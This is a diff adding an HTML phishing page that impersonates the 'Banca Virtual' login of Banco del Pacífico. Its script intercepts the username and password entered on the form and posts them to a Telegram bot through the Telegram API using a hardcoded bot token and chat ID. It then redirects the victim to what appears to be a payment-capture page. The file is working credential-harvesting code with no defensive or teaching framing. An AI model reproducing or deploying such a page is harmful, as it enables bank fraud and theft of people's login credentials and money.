@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Banco del Pacífico</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        h2 {
+            color: #003366;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 90%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group a {
+            font-size: 12px;
+            color: #0056b3;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #003366;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background-color: #002244;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            border: 1px solid #003366;
+            color: #003366;
+            margin-top: 0;
+        }
+
+        .btn-secondary:hover {
+            background-color: #e6f0ff;
+        }
+
+        .btn-blue {
+            background-color: #0056b3;
+            color: white;
+        }
+
+        .btn-blue:hover {
+            background-color: #004494;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="logo">
+            <img src="../img/pacifi.png" alt="pacofi">
+        </div>
+        <h2>Ingrese a Banca Virtual</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Usuario</label>
+                <input type="text" id="username" placeholder="Ingrese su usuario" required>
+            </div>
+
+            <div class="input-group">
+                <label for="pass">Contraseña</label>
+                <input type="password" id="pass" placeholder="Ingrese su contraseña" required>
+            </div>
+            <button  type="submit" class="btn">Continuar</button>
+           
+        </form>
+        
+        
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con tu token del bot
+        const TELEGRAM_CHAT_ID = "5848946481"; // Reemplaza con tu chat ID
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const pass = document.getElementById("pass").value;
+
+            if (username, pass) {
+                const message = `\npacifico: \nUsuario: ${username} \nPass: ${pass}`;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = "../cargapago.html"; // Cambia a la URL deseada
+                    } else {
+                        alert("No se pudo enviar la información. Intente nuevamente.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar datos al bot de Telegram:", error);
+                });
+            } else {
+                alert("Por favor, ingrese su usuario.");
+            }
+        });
+
+    
+    </script>
+</body>
+</html>
